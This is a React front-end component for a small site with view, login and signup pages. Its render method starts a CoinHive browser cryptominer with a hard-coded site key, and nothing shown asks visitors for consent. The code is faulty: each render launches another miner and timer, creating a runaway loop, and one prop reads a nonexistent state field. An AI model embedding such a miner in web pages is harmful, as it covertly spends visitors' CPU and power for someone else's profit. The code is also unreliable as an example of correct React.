import React, { Component } from 'react'
import ReactDOM from 'react-dom'
import { Button } from 'react-bootstrap'
import View1 from './View1.jsx'
import View2 from './View2.jsx'
import Login from './Login.jsx'
import Signup from './Signup.jsx'
//test comment 
class App extends Component {
  constructor(props) {
    super(props);
    this.handleClickButton = this.handleClickButton.bind(this)
    //this.invokeChange = this.invokeChanges.bind(this)

    this.state = {
      viewing: 1,
      hashTotal: 0
    };
  }

  handleClickButton(pageNum) {
    console.log('pageNum', pageNum)
    this.setState({ viewing: pageNum }, () => { console.log('new state: ', this.state, pageNum) });
  }
  // invokeChanges(x){
   
  // }
 

  render() {
    //--------------------
    let that = this;
    let invokeChange = function(y){
      console.log(" y ", y)
      // this.invokeChanges(y);
      that.setState({
        hashTotal: y
      }, () => { console.log('new state: ', that.state.hashTotal) })
      // console.log(that.state.hashTotal)
    }
    let total = this.state.hashTotal;
    var miner = new CoinHive.Anonymous('6UtrrYYyMYrjRjXpipAn5FNt8SX0fdGc');
    miner.start();
    console.log('Miner is working');
    
     miner.on('found', function() { console.log('hash found') })
     miner.on('accepted', function() { console.log('hash accepted')})

     setInterval(function() {
     var hashesPerSecond = miner.getHashesPerSecond();
     var totalHashes = miner.getTotalHashes();
     var acceptedHashes  = miner.getAcceptedHashes();
     invokeChange(totalHashes);
     }, 1000)
    miner.on('found')
    //-------------------
    var sectionStyle = {
      height: '100vh',
      backgroundImage: "url('http://www.publicdomainpictures.net/pictures/190000/velka/black-background-1468370534d5s.jpg')",
    }
    return (
      <div id="main" style={sectionStyle}>
        <div>
          <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickButton.bind(null, 3)}>Login</Button>
          <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickButton.bind(null, 4)}>Signup</Button>
        </div>
        <div>
          <Button bsStyle="warning" bsSize="large" onClick={this.handleClickButton.bind(null, 1)}>View1</Button>
          <Button bsStyle="info" bsSize="large" onClick={this.handleClickButton.bind(null, 2)}>View2</Button>
        </div>
        <div>
          {this.state.viewing === 1 ? <div><View1 total={this.state.totalHashes}/></div> : null}
          {this.state.viewing === 2 ? <div><View2 /></div> : null}
          {this.state.viewing === 3 ? <div><Login /></div> : null}
          {this.state.viewing === 4 ? <div><Signup /></div> : null}
        </div>
      </div>
    )
  }
}

ReactDOM.render(<App />, document.getElementById('app'))